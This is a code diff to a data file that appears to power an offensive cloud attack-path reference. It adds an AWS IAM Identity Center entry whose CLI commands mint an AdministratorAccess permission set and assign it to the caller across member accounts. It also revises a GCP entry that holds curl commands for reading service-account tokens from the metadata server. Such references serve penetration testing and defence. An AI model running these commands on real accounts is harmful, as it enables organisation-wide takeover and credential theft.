@@ -563,6 +563,20 @@ var CLOUD_MAP = {
           ],
           outcomes: [{ label: "Code on host", color: "#22d3ee" }, { label: "Role credentials", color: "#22d3ee" }],
           moveTo: [{ section: "aws-access", tech: "imds-ssrf", note: "pull the host role from IMDS" }]
+        },
+        {
+          id: "identity-center",
+          title: "IAM Identity Center (SSO) permission-set escalation",
+          theory: { label: "AWS Attack Paths", url: "theory/2026-10-09-aws-attack-paths.html" },
+          desc: "In orgs that use IAM Identity Center (the modern successor to standalone IAM users), permission sets are the real admin surface. A principal in the management / delegated-admin account that can author and assign them mints an admin permission set and grants it to itself in any member account — org-wide escalation that never touches classic IAM.",
+          cmds: [
+            "aws sso-admin list-instances",
+            "aws sso-admin create-permission-set --instance-arn <arn> --name pwn",
+            "aws sso-admin attach-managed-policy-to-permission-set --instance-arn <arn> --permission-set-arn <ps> --managed-policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+            "aws sso-admin create-account-assignment --instance-arn <arn> --permission-set-arn <ps> --target-id <account> --target-type AWS_ACCOUNT --principal-type USER --principal-id <me>"
+          ],
+          outcomes: [{ label: "Account admin", color: "#4ade80" }],
+          moveTo: [{ section: "takeover", note: "admin in any member account, org-wide" }]
         }
       ]
     },
@@ -723,7 +737,7 @@ var CLOUD_MAP = {
           id: "gcp-metadata",
           title: "Metadata token & default-SA Editor",
           theory: { label: "GCP Attack Paths", url: "theory/2026-10-15-gcp-attack-paths.html" },
-          desc: "Code (or an SSRF) on a GCE VM / Cloud Run / GKE node reads the attached SA's token from the metadata server. The default Compute/App Engine/Cloud Build SAs were historically granted project Editor, so even a default attachment is usually a strong identity.",
+          desc: "Code (or an SSRF) on a GCE VM / Cloud Run / GKE node reads the attached SA's token from the metadata server. The default Compute/App Engine/Cloud Build SAs were historically granted project Editor — still true on older or unconstrained projects, though orgs created since ~mid-2024 may disable it via the iam.automaticIamGrantsForDefaultServiceAccounts constraint — so read the token's real scopes/roles rather than assuming Editor.",
           cmds: [
             "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'",
             "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes'"
